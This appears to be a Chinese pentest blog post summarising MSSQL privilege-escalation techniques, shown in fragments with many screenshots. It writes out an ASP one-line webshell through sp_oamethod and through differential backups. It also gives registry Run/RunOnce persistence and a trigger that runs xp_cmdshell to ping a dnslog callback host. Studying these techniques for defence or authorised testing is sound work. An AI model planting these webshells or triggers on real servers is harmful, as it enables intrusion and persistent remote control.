...
title: "Mssql 提权"
author: "XiDanEr"
description : "总结大部分MsSql 提权方法"
tags: [数据库,MsSql,权限提升]
index_img: https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/banner.png
date: 2022-04-22
---

# Mssql 提权

![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/banner.png)

学习: https://r0fus0d.blog.ffffffff0x.com/post/mssql-pentest/
...
-- 列出所有 c:\ 文件和目录,子目录,内容会很多,慎用,略
exec xp_dirtree 'c:'
```

![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/1.png)

![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/2.png)
...
![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/3.png)

### xp_fixeddrives

用于查看磁盘驱动器剩余（free）的空间
...
![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/4.png)
...
![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/5.png)
...
- 存在:
  - ![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/6.png)
- 不存在:
  - ![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/7.png)


### xp_create_subdir

用于**创建子目录**的存储过程，参数是子目录的路径
...
![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/8.png)

查询后发现存在

![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/9.png)

### xp_delete_file

可用于删除文件的存储过程，但该存储过程不会删除任意类型的文件，系统限制它只能删除**特定类型**（备份文件和报表文件）的文件。
...
![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/10.png)
...
exec sp_oamethod @o, 'createtextfile', @f out, 'C:\www\test1.asp', 1
exec @ret = sp_oamethod @f, 'writeline', NULL,'<%execute(request("a"))%>'
```

查询为 **DBA 权限**:

![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/11.png)

利用存储过程写入一句话:

![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/12.png)

查看确实写入成功:

![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/13.png)
...
```sql
-- 生成备份文件,注意库名和路径
backup database 库名 to disk = 'c:\www\bak.bak';
...
-- 再次备份,注意路径
backup database 库名 to disk='c:\www\d.asp' WITH DIFFERENTIAL,FORMAT;--
```

生成备份文件：

![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/14.png)

插入一句话后再次备份:

![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/16.png)

写入成功:

![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/15.png)
...
![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/18.png)

写入成功

![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/17.png)
...
![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/19.png)
...
![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/20.png)
...
![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/21.png)
...
![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/22.png)
...
![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/23.png)
...
![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/24.png)
...
![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/25.png)

![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/26.png)

### filesystemobject COM 对象利用

详情: https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/filesystemobject-object
...
exec @ret = sp_oamethod @f, 'writeline', NULL, 'Made In Heaven'
...
![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/28.png)

![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/27.png)
...
## ScriptControl COM 对象利用

详情: https://developpaper.com/introduction-of-msscriptcontrol-scriptcontrol-component-properties-methods-and-events/
...
![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/29.png)

![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/30.png)
...
![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/31.png)

### Run & RunOnce

`Run` 和 `RunOnce` 注册表项会导致程序在**用户每次登录时运行**。
...
![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/32.png)
...
`当实验中提示`: StartService() 返回了错误 1058，“无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动。” 可以尝试以下方法

 - 在Windows服务控制台里手动启动，或者自动启动（默认），这个也是最常用的方式
   - ![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/33.png)
 - SQLServer本身自己提供的启动方式，我们这里可以手动启动
   - ![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/34.png)
 - 在SQLServer的SSMS里面手动启动它，这个方式一般大部分利用这种方式进行手动重启
   - ![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/35.png)
 - 通过Windows命令窗口，用`net start mssqlserver`命令手动启动
   - ![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/36.png)
...
![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/37.png)
...
登录触发器将为`响应 LOGIN 事件而激发存储过程`。与 SQL Server 实例建立用户会话时将引发此事件。登录触发器将在登录的身份验证阶段完成之后且用户会话实际建立之前激发。因此，来自触发器内部且通常将到达用户的所有消息(例如错误消息和来自 PRINT 语句的消息)会传送到 SQL Server 错误日志。如果身份验证失败，将不激发登录触发器。
...
AFTER UPDATE as
begin
    execute master..xp_cmdshell 'cmd.exe /c ping 0eft7f.dnslog.cn'
end
go

-- user 表 update 更新时，自动触发
UPDATE users SET id = '3' WHERE name = 'f0x'
```

实际测试，可以看到执行命令卡住了,一直没有结束

![](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/OS/Windows/MsSql/Systemupdate/38.png)

然后就一直卡着了 我的评价是 不如去运行一个免杀上线。此时当语句执行完毕返回结果，执行时间等于 免杀 运行的时间
...
- [mssql 提权(总结篇)](https://r0fus0d.blog.ffffffff0x.com/post/mssql-pentest/#xp_regwrite)
